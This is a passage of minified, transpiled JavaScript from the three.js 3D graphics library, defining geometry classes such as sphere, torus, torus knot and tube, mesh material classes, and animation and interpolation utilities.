d=0;d<r.length;d++)p(r[d]),e.addGroup(c,u,d),c+=u,u=0;function p(e){var t=o.length/3,n=e.extractPoints(i),r=n.shape,c=n.holes;!1===Ks.isClockWise(r)&&(r=r.reverse());for(var d=0,p=c.length;d<p;d++){var h=c[d];!0===Ks.isClockWise(h)&&(c[d]=h.reverse())}for(var f=Ks.triangulateShape(r,c),A=0,m=c.length;A<m;A++){var v=c[A];r=r.concat(v)}for(var g=0,y=r.length;g<y;g++){var b=r[g];o.push(b.x,b.y,0),s.push(0,0,1),l.push(b.x,b.y)}for(var _=0,w=f.length;_<w;_++){var C=f[_],x=C[0]+t,S=C[1]+t,k=C[2]+t;a.push(x,S,k),u+=3}}return e.setIndex(a),e.setAttribute("position",new en(o,3)),e.setAttribute("normal",new en(s,3)),e.setAttribute("uv",new en(l,2)),e}return _createClass2(n,[{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return function(e,t){if(t.shapes=[],Array.isArray(e))for(var n=0,r=e.length;n<r;n++){var i=e[n];t.shapes.push(i.uuid)}else t.shapes.push(e.uuid);return t}(this.parameters.shapes,e)}}],[{key:"fromJSON",value:function(e,t){for(var r=[],i=0,a=e.shapes.length;i<a;i++){var o=t[e.shapes[i]];r.push(o)}return new n(r,e.curveSegments)}}]),n}(),il=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:32,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:16,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:0,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:2*Math.PI,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:0,c=6<arguments.length&&void 0!==arguments[6]?arguments[6]:Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="SphereGeometry",e.parameters={radius:r,widthSegments:i,heightSegments:a,phiStart:o,phiLength:s,thetaStart:l,thetaLength:c},i=Math.max(3,Math.floor(i)),a=Math.max(2,Math.floor(a));for(var u=Math.min(l+c,Math.PI),d=0,p=[],h=new ye,f=new ye,A=[],m=[],v=[],g=[],y=0;y<=a;y++){var b=[],_=y/a,w=0;0==y&&0==l?w=.5/i:y==a&&u==Math.PI&&(w=-.5/i);for(var C=0;C<=i;C++){var x=C/i;h.x=-r*Math.cos(o+x*s)*Math.sin(l+_*c),h.y=r*Math.cos(l+_*c),h.z=r*Math.sin(o+x*s)*Math.sin(l+_*c),m.push(h.x,h.y,h.z),f.copy(h).normalize(),v.push(f.x,f.y,f.z),g.push(x+w,1-_),b.push(d++)}p.push(b)}for(var S=0;S<a;S++)for(var k=0;k<i;k++){var M=p[S][k+1],B=p[S][k],E=p[S+1][k],T=p[S+1][k+1];(0!==S||0<l)&&A.push(M,B,T),(S!==a-1||u<Math.PI)&&A.push(B,E,T)}return e.setIndex(A),e.setAttribute("position",new en(m,3)),e.setAttribute("normal",new en(v,3)),e.setAttribute("uv",new en(g,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.widthSegments,e.heightSegments,e.phiStart,e.phiLength,e.thetaStart,e.thetaLength)}}]),n}(),al=function(e){_inherits2(n,Xo);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return _classCallCheck2(this,n),(e=t.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],r,i)).type="TetrahedronGeometry",e.parameters={radius:r,detail:i},e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.detail)}}]),n}(),ol=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:.4,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:8,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:6,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:2*Math.PI;_classCallCheck2(this,n),(e=t.call(this)).type="TorusGeometry",e.parameters={radius:r,tube:i,radialSegments:a,tubularSegments:o,arc:s},a=Math.floor(a),o=Math.floor(o);for(var l=[],c=[],u=[],d=[],p=new ye,h=new ye,f=new ye,A=0;A<=a;A++)for(var m=0;m<=o;m++){var v=m/o*s,g=A/a*Math.PI*2;h.x=(r+i*Math.cos(g))*Math.cos(v),h.y=(r+i*Math.cos(g))*Math.sin(v),h.z=i*Math.sin(g),c.push(h.x,h.y,h.z),p.x=r*Math.cos(v),p.y=r*Math.sin(v),f.subVectors(h,p).normalize(),u.push(f.x,f.y,f.z),d.push(m/o),d.push(A/a)}for(var y=1;y<=a;y++)for(var b=1;b<=o;b++){var _=(o+1)*y+b-1,w=(o+1)*(y-1)+b-1,C=(o+1)*(y-1)+b,x=(o+1)*y+b;l.push(_,w,x),l.push(w,C,x)}return e.setIndex(l),e.setAttribute("position",new en(c,3)),e.setAttribute("normal",new en(u,3)),e.setAttribute("uv",new en(d,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.tube,e.radialSegments,e.tubularSegments,e.arc)}}]),n}(),sl=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:.4,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:64,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:8,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:2,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:3;_classCallCheck2(this,n),(e=t.call(this)).type="TorusKnotGeometry",e.parameters={radius:r,tube:i,tubularSegments:a,radialSegments:o,p:s,q:l},a=Math.floor(a),o=Math.floor(o);for(var c=[],u=[],d=[],p=[],h=new ye,f=new ye,A=new ye,m=new ye,v=new ye,g=new ye,y=new ye,b=0;b<=a;++b){var _=b/a*s*Math.PI*2;I(_,s,l,r,A),I(_+.01,s,l,r,m),g.subVectors(m,A),y.addVectors(m,A),v.crossVectors(g,y),y.crossVectors(v,g),v.normalize(),y.normalize();for(var w=0;w<=o;++w){var C=w/o*Math.PI*2,x=-i*Math.cos(C),S=i*Math.sin(C);h.x=A.x+(x*y.x+S*v.x),h.y=A.y+(x*y.y+S*v.y),h.z=A.z+(x*y.z+S*v.z),u.push(h.x,h.y,h.z),f.subVectors(h,A).normalize(),d.push(f.x,f.y,f.z),p.push(b/a),p.push(w/o)}}for(var k=1;k<=a;k++)for(var M=1;M<=o;M++){var B=(o+1)*(k-1)+(M-1),E=(o+1)*k+(M-1),T=(o+1)*k+M,P=(o+1)*(k-1)+M;c.push(B,E,P),c.push(E,T,P)}function I(e,t,n,r,i){var a=Math.cos(e),o=Math.sin(e),s=n/t*e,l=Math.cos(s);i.x=r*(2+l)*.5*a,i.y=r*(2+l)*o*.5,i.z=r*Math.sin(s)*.5}return e.setIndex(c),e.setAttribute("position",new en(u,3)),e.setAttribute("normal",new en(d,3)),e.setAttribute("uv",new en(p,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.radius,e.tube,e.tubularSegments,e.radialSegments,e.p,e.q)}}]),n}(),ll=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new bs(new ye(-1,-1,0),new ye(-1,1,0),new ye(1,1,0)),i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:64,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:8,s=4<arguments.length&&void 0!==arguments[4]&&arguments[4];_classCallCheck2(this,n),(e=t.call(this)).type="TubeGeometry",e.parameters={path:r,tubularSegments:i,radius:a,radialSegments:o,closed:s};var l=r.computeFrenetFrames(i,s);e.tangents=l.tangents,e.normals=l.normals,e.binormals=l.binormals;var c=new ye,u=new ye,d=new re,p=new ye,h=[],f=[],A=[],m=[];function v(e){p=r.getPointAt(e/i,p);for(var t=l.normals[e],n=l.binormals[e],s=0;s<=o;s++){var d=s/o*Math.PI*2,A=Math.sin(d),m=-Math.cos(d);u.x=m*t.x+A*n.x,u.y=m*t.y+A*n.y,u.z=m*t.z+A*n.z,u.normalize(),f.push(u.x,u.y,u.z),c.x=p.x+a*u.x,c.y=p.y+a*u.y,c.z=p.z+a*u.z,h.push(c.x,c.y,c.z)}}return function(){for(var e=0;e<i;e++)v(e);v(!1===s?i:0),function(){for(var e=0;e<=i;e++)for(var t=0;t<=o;t++)d.x=e/i,d.y=t/o,A.push(d.x,d.y)}(),function(){for(var e=1;e<=i;e++)for(var t=1;t<=o;t++){var n=(o+1)*(e-1)+(t-1),r=(o+1)*e+(t-1),a=(o+1)*e+t,s=(o+1)*(e-1)+t;m.push(n,r,s),m.push(r,a,s)}}()}(),e.setIndex(m),e.setAttribute("position",new en(h,3)),e.setAttribute("normal",new en(f,3)),e.setAttribute("uv",new en(A,2)),e}return _createClass2(n,[{key:"toJSON",value:function(){var e=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this);return e.path=this.parameters.path.toJSON(),e}}],[{key:"fromJSON",value:function(e){return new n((new ws[e.path.type]).fromJSON(e.path),e.tubularSegments,e.radius,e.radialSegments,e.closed)}}]),n}(),cl=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:null;if(_classCallCheck2(this,n),(e=t.call(this)).type="WireframeGeometry",e.parameters={geometry:r},null!==r){var i=[],a=new Set,o=new ye,s=new ye;if(null!==r.index){var l=r.attributes.position,c=r.index,u=r.groups;0===u.length&&(u=[{start:0,count:c.count,materialIndex:0}]);for(var d=0,p=u.length;d<p;++d)for(var h=u[d],f=h.start,A=f,m=f+h.count;A<m;A+=3)for(var v=0;v<3;v++){var g=c.getX(A+v),y=c.getX(A+(v+1)%3);o.fromBufferAttribute(l,g),s.fromBufferAttribute(l,y),!0===ul(o,s,a)&&(i.push(o.x,o.y,o.z),i.push(s.x,s.y,s.z))}}else for(var b=r.attributes.position,_=0,w=b.count/3;_<w;_++)for(var C=0;C<3;C++){var x=3*_+C,S=3*_+(C+1)%3;o.fromBufferAttribute(b,x),s.fromBufferAttribute(b,S),!0===ul(o,s,a)&&(i.push(o.x,o.y,o.z),i.push(s.x,s.y,s.z))}e.setAttribute("position",new en(i,3))}return e}return n}();function ul(e,t,n){var r="".concat(e.x,",").concat(e.y,",").concat(e.z,"-").concat(t.x,",").concat(t.y,",").concat(t.z),i="".concat(t.x,",").concat(t.y,",").concat(t.z,"-").concat(e.x,",").concat(e.y,",").concat(e.z);return!0!==n.has(r)&&!0!==n.has(i)&&(n.add(r,i),!0)}var dl=Object.freeze({__proto__:null,BoxGeometry:Tn,BoxBufferGeometry:Tn,CircleGeometry:Wo,CircleBufferGeometry:Wo,ConeGeometry:qo,ConeBufferGeometry:qo,CylinderGeometry:Ko,CylinderBufferGeometry:Ko,DodecahedronGeometry:Yo,DodecahedronBufferGeometry:Yo,EdgesGeometry:ns,ExtrudeGeometry:Ys,ExtrudeBufferGeometry:Ys,IcosahedronGeometry:Zs,IcosahedronBufferGeometry:Zs,LatheGeometry:el,LatheBufferGeometry:el,OctahedronGeometry:tl,OctahedronBufferGeometry:tl,PlaneGeometry:qn,PlaneBufferGeometry:qn,PolyhedronGeometry:Xo,PolyhedronBufferGeometry:Xo,RingGeometry:nl,RingBufferGeometry:nl,ShapeGeometry:rl,ShapeBufferGeometry:rl,SphereGeometry:il,SphereBufferGeometry:il,TetrahedronGeometry:al,TetrahedronBufferGeometry:al,TorusGeometry:ol,TorusBufferGeometry:ol,TorusKnotGeometry:sl,TorusKnotBufferGeometry:sl,TubeGeometry:ll,TubeBufferGeometry:ll,WireframeGeometry:cl}),pl=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="ShadowMaterial",r.color=new $t(0),r.transparent=!0,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this}}]),n}();pl.prototype.isShadowMaterial=!0;var hl=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).defines={STANDARD:""},r.type="MeshStandardMaterial",r.color=new $t(16777215),r.roughness=1,r.metalness=0,r.map=null,r.lightMap=null,r.lightMapIntensity=1,r.aoMap=null,r.aoMapIntensity=1,r.emissive=new $t(0),r.emissiveIntensity=1,r.emissiveMap=null,r.bumpMap=null,r.bumpScale=1,r.normalMap=null,r.normalMapType=0,r.normalScale=new re(1,1),r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.roughnessMap=null,r.metalnessMap=null,r.alphaMap=null,r.envMap=null,r.envMapIntensity=1,r.refractionRatio=.98,r.wireframe=!1,r.wireframeLinewidth=1,r.wireframeLinecap="round",r.wireframeLinejoin="round",r.flatShading=!1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapIntensity=e.envMapIntensity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.flatShading=e.flatShading,this}}]),n}();hl.prototype.isMeshStandardMaterial=!0;var fl=function(e){_inherits2(n,hl);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).defines={STANDARD:"",PHYSICAL:""},r.type="MeshPhysicalMaterial",r.clearcoatMap=null,r.clearcoatRoughness=0,r.clearcoatRoughnessMap=null,r.clearcoatNormalScale=new re(1,1),r.clearcoatNormalMap=null,r.ior=1.5,Object.defineProperty(_assertThisInitialized2(r),"reflectivity",{get:function(){return X(2.5*(this.ior-1)/(this.ior+1),0,1)},set:function(e){this.ior=(1+.4*e)/(1-.4*e)}}),r.sheenColor=new $t(0),r.sheenColorMap=null,r.sheenRoughness=1,r.sheenRoughnessMap=null,r.transmissionMap=null,r.thickness=0,r.thicknessMap=null,r.attenuationDistance=0,r.attenuationColor=new $t(1,1,1),r.specularIntensity=1,r.specularIntensityMap=null,r.specularColor=new $t(1,1,1),r.specularColorMap=null,r._sheen=0,r._clearcoat=0,r._transmission=0,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.defines={STANDARD:"",PHYSICAL:""},this.clearcoat=e.clearcoat,this.clearcoatMap=e.clearcoatMap,this.clearcoatRoughness=e.clearcoatRoughness,this.clearcoatRoughnessMap=e.clearcoatRoughnessMap,this.clearcoatNormalMap=e.clearcoatNormalMap,this.clearcoatNormalScale.copy(e.clearcoatNormalScale),this.ior=e.ior,this.sheen=e.sheen,this.sheenColor.copy(e.sheenColor),this.sheenColorMap=e.sheenColorMap,this.sheenRoughness=e.sheenRoughness,this.sheenRoughnessMap=e.sheenRoughnessMap,this.transmission=e.transmission,this.transmissionMap=e.transmissionMap,this.thickness=e.thickness,this.thicknessMap=e.thicknessMap,this.attenuationDistance=e.attenuationDistance,this.attenuationColor.copy(e.attenuationColor),this.specularIntensity=e.specularIntensity,this.specularIntensityMap=e.specularIntensityMap,this.specularColor.copy(e.specularColor),this.specularColorMap=e.specularColorMap,this}},{key:"sheen",get:function(){return this._sheen},set:function(e){0<this._sheen!=0<e&&this.version++,this._sheen=e}},{key:"clearcoat",get:function(){return this._clearcoat},set:function(e){0<this._clearcoat!=0<e&&this.version++,this._clearcoat=e}},{key:"transmission",get:function(){return this._transmission},set:function(e){0<this._transmission!=0<e&&this.version++,this._transmission=e}}]),n}();fl.prototype.isMeshPhysicalMaterial=!0;var Al=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshPhongMaterial",r.color=new $t(16777215),r.specular=new $t(1118481),r.shininess=30,r.map=null,r.lightMap=null,r.lightMapIntensity=1,r.aoMap=null,r.aoMapIntensity=1,r.emissive=new $t(0),r.emissiveIntensity=1,r.emissiveMap=null,r.bumpMap=null,r.bumpScale=1,r.normalMap=null,r.normalMapType=0,r.normalScale=new re(1,1),r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.specularMap=null,r.alphaMap=null,r.envMap=null,r.combine=0,r.reflectivity=1,r.refractionRatio=.98,r.wireframe=!1,r.wireframeLinewidth=1,r.wireframeLinecap="round",r.wireframeLinejoin="round",r.flatShading=!1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.specular.copy(e.specular),this.shininess=e.shininess,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.flatShading=e.flatShading,this}}]),n}();Al.prototype.isMeshPhongMaterial=!0;var ml=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).defines={TOON:""},r.type="MeshToonMaterial",r.color=new $t(16777215),r.map=null,r.gradientMap=null,r.lightMap=null,r.lightMapIntensity=1,r.aoMap=null,r.aoMapIntensity=1,r.emissive=new $t(0),r.emissiveIntensity=1,r.emissiveMap=null,r.bumpMap=null,r.bumpScale=1,r.normalMap=null,r.normalMapType=0,r.normalScale=new re(1,1),r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.alphaMap=null,r.wireframe=!1,r.wireframeLinewidth=1,r.wireframeLinecap="round",r.wireframeLinejoin="round",r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.map=e.map,this.gradientMap=e.gradientMap,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.alphaMap=e.alphaMap,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this}}]),n}();ml.prototype.isMeshToonMaterial=!0;var vl=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshNormalMaterial",r.bumpMap=null,r.bumpScale=1,r.normalMap=null,r.normalMapType=0,r.normalScale=new re(1,1),r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.wireframe=!1,r.wireframeLinewidth=1,r.fog=!1,r.flatShading=!1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.flatShading=e.flatShading,this}}]),n}();vl.prototype.isMeshNormalMaterial=!0;var gl=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshLambertMaterial",r.color=new $t(16777215),r.map=null,r.lightMap=null,r.lightMapIntensity=1,r.aoMap=null,r.aoMapIntensity=1,r.emissive=new $t(0),r.emissiveIntensity=1,r.emissiveMap=null,r.specularMap=null,r.alphaMap=null,r.envMap=null,r.combine=0,r.reflectivity=1,r.refractionRatio=.98,r.wireframe=!1,r.wireframeLinewidth=1,r.wireframeLinecap="round",r.wireframeLinejoin="round",r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this}}]),n}();gl.prototype.isMeshLambertMaterial=!0;var yl=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).defines={MATCAP:""},r.type="MeshMatcapMaterial",r.color=new $t(16777215),r.matcap=null,r.map=null,r.bumpMap=null,r.bumpScale=1,r.normalMap=null,r.normalMapType=0,r.normalScale=new re(1,1),r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.alphaMap=null,r.flatShading=!1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.defines={MATCAP:""},this.color.copy(e.color),this.matcap=e.matcap,this.map=e.map,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.alphaMap=e.alphaMap,this.flatShading=e.flatShading,this}}]),n}();yl.prototype.isMeshMatcapMaterial=!0;var bl=function(e){_inherits2(n,So);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="LineDashedMaterial",r.scale=1,r.dashSize=3,r.gapSize=1,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.scale=e.scale,this.dashSize=e.dashSize,this.gapSize=e.gapSize,this}}]),n}();bl.prototype.isLineDashedMaterial=!0;var _l=Object.freeze({__proto__:null,ShadowMaterial:pl,SpriteMaterial:Ha,RawShaderMaterial:or,ShaderMaterial:Ln,PointsMaterial:No,MeshPhysicalMaterial:fl,MeshStandardMaterial:hl,MeshPhongMaterial:Al,MeshToonMaterial:ml,MeshNormalMaterial:vl,MeshLambertMaterial:gl,MeshDepthMaterial:_a,MeshDistanceMaterial:wa,MeshBasicMaterial:zt,MeshMatcapMaterial:yl,LineDashedMaterial:bl,LineBasicMaterial:So,Material:Lt}),wl={arraySlice:function(e,t,n){return wl.isTypedArray(e)?new e.constructor(e.subarray(t,void 0!==n?n:e.length)):e.slice(t,n)},convertArray:function(e,t,n){return!e||!n&&e.constructor===t?e:"number"==typeof t.BYTES_PER_ELEMENT?new t(e):Array.prototype.slice.call(e)},isTypedArray:function(e){return ArrayBuffer.isView(e)&&!(e instanceof DataView)},getKeyframeOrder:function(e){for(var t=e.length,n=new Array(t),r=0;r!==t;++r)n[r]=r;return n.sort((function(t,n){return e[t]-e[n]})),n},sortedArray:function(e,t,n){for(var r=e.length,i=new e.constructor(r),a=0,o=0;o!==r;++a)for(var s=n[a]*t,l=0;l!==t;++l)i[o++]=e[s+l];return i},flattenJSON:function(e,t,n,r){for(var i=1,a=e[0];void 0!==a&&void 0===a[r];)a=e[i++];if(void 0!==a){var o=a[r];if(void 0!==o)if(Array.isArray(o))for(;void 0!==(o=a[r])&&(t.push(a.time),n.push.apply(n,o)),void 0!==(a=e[i++]););else if(void 0!==o.toArray)for(;void 0!==(o=a[r])&&(t.push(a.time),o.toArray(n,n.length)),void 0!==(a=e[i++]););else for(;void 0!==(o=a[r])&&(t.push(a.time),n.push(o)),void 0!==(a=e[i++]););}},subclip:function(e,t,n,r){var i=4<arguments.length&&void 0!==arguments[4]?arguments[4]:30,a=e.clone();a.name=t;for(var o=[],s=0;s<a.tracks.length;++s){for(var l=a.tracks[s],c=l.getValueSize(),u=[],d=[],p=0;p<l.times.length;++p){var h=l.times[p]*i;if(!(h<n||r<=h)){u.push(l.times[p]);for(var f=0;f<c;++f)d.push(l.values[p*c+f])}}0!==u.length&&(l.times=wl.convertArray(u,l.times.constructor),l.values=wl.convertArray(d,l.values.constructor),o.push(l))}a.tracks=o;for(var A=1/0,m=0;m<a.tracks.length;++m)A>a.tracks[m].times[0]&&(A=a.tracks[m].times[0]);for(var v=0;v<a.tracks.length;++v)a.tracks[v].shift(-1*A);return a.resetDuration(),a},makeClipAdditive:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:e,r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:30;r<=0&&(r=30);for(var i=n.tracks.length,a=t/r,o=function(t){var r=n.tracks[t],i=r.ValueTypeName;if("bool"===i||"string"===i)return"continue";var o=e.tracks.find((function(e){return e.name===r.name&&e.ValueTypeName===i}));if(void 0===o)return"continue";var s=0,l=r.getValueSize();r.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline&&(s=l/3);var c=0,u=o.getValueSize();o.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline&&(c=u/3);var d=r.times.length-1,p=void 0;if(a<=r.times[0]){var h=s,f=l-s;p=wl.arraySlice(r.values,h,f)}else if(a>=r.times[d]){var A=d*l+s,m=A+l-s;p=wl.arraySlice(r.values,A,m)}else{var v=r.createInterpolant(),g=s,y=l-s;v.evaluate(a),p=wl.arraySlice(v.resultBuffer,g,y)}"quaternion"===i&&(new ge).fromArray(p).normalize().conjugate().toArray(p);for(var b=o.times.length,_=0;_<b;++_){var w=_*u+c;if("quaternion"===i)ge.multiplyQuaternionsFlat(o.values,w,p,0,o.values,w);else for(var C=u-2*c,x=0;x<C;++x)o.values[w+x]-=p[x]}},s=0;s<i;++s)o(s);return e.blendMode=2501,e}},Cl=function(){function e(t,n,r,i){_classCallCheck2(this,e),this.parameterPositions=t,this._cachedIndex=0,this.resultBuffer=void 0!==i?i:new n.constructor(r),this.sampleValues=n,this.valueSize=r,this.settings=null,this.DefaultSettings_={}}return _createClass2(e,[{key:"evaluate",value:function(e){var t=this.parameterPositions,n=this._cachedIndex,r=t[n],i=t[n-1];e:{t:{var a;n:{r:if(!(e<r)){for(var o=n+2;;){if(void 0===r){if(e<i)break r;return n=t.length,this._cachedIndex=n,this.afterEnd_(n-1,e,i)}if(n===o)break;if(i=r,e<(r=t[++n]))break t}a=t.length;break n}if(i<=e)break e;var s=t[1];e<s&&(n=2,i=s);for(var l=n-2;;){if(void 0===i)return this._cachedIndex=0,this.beforeStart_(0,e,r);if(n===l)break;if(r=i,(i=t[--n-1])<=e)break t}a=n,n=0}for(;n<a;){var c=n+a>>>1;e<t[c]?a=c:n=c+1}if(r=t[n],void 0===(i=t[n-1]))return this._cachedIndex=0,this.beforeStart_(0,e,r);if(void 0===r)return n=t.length,this._cachedIndex=n,this.afterEnd_(n-1,i,e)}this._cachedIndex=n,this.intervalChanged_(n,i,r)}return this.interpolate_(n,i,e,r)}},{key:"getSettings_",value:function(){return this.settings||this.DefaultSettings_}},{key:"copySampleValue_",value:function(e){for(var t=this.resultBuffer,n=this.sampleValues,r=this.valueSize,i=e*r,a=0;a!==r;++a)t[a]=n[i+a];return t}},{key:"interpolate_",value:function(){throw new Error("call to abstract method")}},{key:"intervalChanged_",value:function(){}}]),e}();Cl.prototype.beforeStart_=Cl.prototype.copySampleValue_,Cl.prototype.afterEnd_=Cl.prototype.copySampleValue_;var xl=function(e){_inherits2(n,Cl);var t=_createSuper(n);function n(e,r,i,a){var o;return 